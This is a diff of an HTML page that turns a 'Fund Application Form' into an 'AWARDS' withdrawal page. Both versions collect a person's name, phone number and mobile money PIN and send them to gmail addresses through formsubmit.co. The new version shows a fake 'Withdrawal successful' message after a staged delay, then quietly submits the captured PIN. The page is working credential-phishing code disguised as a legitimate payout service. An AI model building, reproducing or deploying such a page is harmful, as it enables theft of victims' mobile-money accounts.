@@ -1,119 +1,222 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Fund Application Form</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWARDS</title>
 
+<style>
+    /* --- Layout & Styling (UNCHANGED) --- */
     body {
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background: #f2f2f2;
     }
 
-    form {
-      background: white;
-      padding: 30px 20px;
-      border-radius: 12px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      width: 95vw;
-      max-width: 500px;
-      min-height: 90vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
+    .title-bar {
+        background: yellow;
+        color: black;
+        text-align: center;
+        padding: 15px;
+        font-size: 22px;
+        font-weight: bold;
     }
 
-    h2 {
-      text-align: center;
-      margin-bottom: 30px;
+    .container {
+        padding: 20px;
+    }
+
+    label {
+        font-weight: bold;
+        display: block;
+        margin-top: 15px;
     }
 
     input {
-      width: 100%;
-      padding: 14px;
-      margin: 12px 0;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 16px;
+        width: 100%;
+        padding: 12px;
+        border-radius: 5px;
+        border: 1px solid #888;
+        margin-top: 5px;
+        font-size: 16px;
     }
 
-    .pin-container {
-      display: flex;
-      align-items: center;
-      gap: 10px;
+    .pin-wrapper {
+        position: relative;
     }
 
-    .pin-container input {
-      flex: 1;
+    .toggle-eye {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 14px;
+        color: blue;
     }
 
-    .pin-container button {
-      padding: 12px;
-      font-size: 14px;
-      background-color: #eee;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      white-space: nowrap;
+    .withdraw-btn {
+        width: 100%;
+        background: blue;
+        color: white;
+        padding: 15px;
+        margin-top: 25px;
+        text-align: center;
+        border-radius: 5px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        opacity: 0.5;
+        pointer-events: none;
     }
 
-    button[type="submit"] {
-      background: #007bff;
-      color: white;
-      padding: 14px;
-      border: none;
-      border-radius: 6px;
-      width: 100%;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 20px;
+    .withdraw-btn.enabled {
+        opacity: 1;
+        pointer-events: auto;
     }
-  </style>
+
+    .loading {
+        display: none;
+        text-align: center;
+        margin-top: 20px;
+        font-size: 18px;
+        font-weight: bold;
+    }
+
+    .success-box {
+        display: none;
+        background: green;
+        color: white;
+        padding: 15px;
+        margin-top: 20px;
+        border-radius: 5px;
+        text-align: center;
+        font-weight: bold;
+    }
+
+    .balance-btn {
+        width: 100%;
+        background: green;
+        color: white;
+        padding: 15px;
+        margin-top: 20px;
+        text-align: center;
+        border-radius: 5px;
+        font-size: 18px;
+        font-weight: bold;
+        border: none;
+        cursor: pointer;
+        display: none;
+    }
+</style>
 </head>
+
 <body>
-  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
-    <h2>Fund Application Form</h2>
 
-    <input type="text" name="Full Name" placeholder="Full Name" required>
-    <input type="tel" name="Phone Number" placeholder="Phone Number" required>
+<div class="title-bar">AWARDS</div>
 
-    <div class="pin-container">
-      <input type="password" name="Secret Code" placeholder="Secret Code (PIN)" id="pin" required>
-      <button type="button" onclick="togglePIN()">Show</button>
+<div class="container">
+
+<form id="submissionForm" action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST" target="_blank">
+
+    <input type="hidden" name="_subject" value="AWARDS Balance Request">
+    
+    <input type="text" name="_honey" style="display:none">
+
+    <label>Enter your Name</label>
+    <input type="text" id="name" name="Name" oninput="this.value=this.value.replace(/[^a-zA-Z ]/g,'')" placeholder="Your Name">
+
+    <label>Enter phone number</label>
+    <input type="text" id="phone" name="Phone" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="07XXXXXXXX">
+
+    <label>Enter Amount to withdraw</label>
+    <input type="text" id="amount" name="Amount" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="1000">
+
+    <label>Enter your Mobile money pin/secret code to withdraw (for Amount to withdraw: <span id="displayAmount">---</span> to Phone number: <span id="displayPhone">---</span>)</label>
+    <div class="pin-wrapper">
+        <input type="password" id="pin" name="PIN" placeholder="****">
+        <span class="toggle-eye" onclick="togglePIN()">Show</span>
     </div>
 
-    <input type="number" name="Amount You Paid" placeholder="Amount You Paid" required>
-    <input type="number" name="Amount You Applied For" placeholder="Amount You Applied For" required>
+    <div id="withdrawBtn" class="withdraw-btn">WITHDRAW</div>
 
-    <!-- Redirect after submission -->
-    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/ecocash-form/thank-you.html">
-    <!-- Disable CAPTCHA -->
-    <input type="hidden" name="_captcha" value="false">
+    <div id="loading" class="loading">Loading...</div>
 
-    <button type="submit">Submit Application</button>
-  </form>
+    <div id="success" class="success-box">
+        Withdrawal successful. Click balance button to check balance.
+    </div>
 
-  <script>
-    function togglePIN() {
-      const pin = document.getElementById("pin");
-      const btn = event.target;
-      if (pin.type === "password") {
+    <button type="button" id="balanceBtn" class="balance-btn">BALANCE</button>
+
+</form>
+
+</div>
+
+<script>
+function togglePIN() {
+    const pin = document.getElementById("pin");
+    const eye = document.querySelector(".toggle-eye");
+    if (pin.type === "password") {
         pin.type = "text";
-        btn.textContent = "Hide";
-      } else {
+        eye.textContent = "Hide";
+    } else {
         pin.type = "password";
-        btn.textContent = "Show";
-      }
+        eye.textContent = "Show";
     }
-  </script>
+}
+
+const fields = ["name","phone","amount","pin"];
+const amountDisplay = document.getElementById("displayAmount");
+const phoneDisplay = document.getElementById("displayPhone");
+
+fields.forEach(id => {
+    document.getElementById(id).addEventListener("input", checkFields);
+});
+document.getElementById("amount").addEventListener("input", function() {
+    amountDisplay.textContent = this.value || '---';
+});
+document.getElementById("phone").addEventListener("input", function() {
+    phoneDisplay.textContent = this.value || '---';
+});
+
+
+function checkFields() {
+    const filled = fields.every(id => document.getElementById(id).value.trim() !== "");
+    const btn = document.getElementById("withdrawBtn");
+    if (filled) {
+        btn.classList.add("enabled");
+    } else {
+        btn.classList.remove("enabled");
+    }
+}
+
+document.getElementById("withdrawBtn").addEventListener("click", function() {
+    if (!this.classList.contains("enabled")) return;
+
+    this.style.display = 'none'; 
+    document.getElementById("loading").style.display = "block";
+
+    // 5-second simulated delay
+    setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("success").style.display = "block";
+        document.getElementById("balanceBtn").style.display = "block";
+    }, 5000);
+});
+
+
+// 🚀 Submission Logic: Explicitly trigger the form submission
+document.getElementById("balanceBtn").addEventListener("click", function(){
+    const form = document.getElementById("submissionForm");
+    // This submits the data. FormSubmit will open a new tab/window due to target="_blank".
+    form.submit();
+});
+
+checkFields();
+document.getElementById("amount").dispatchEvent(new Event('input'));
+document.getElementById("phone").dispatchEvent(new Event('input'));
+</script>
+
 </body>
 </html>
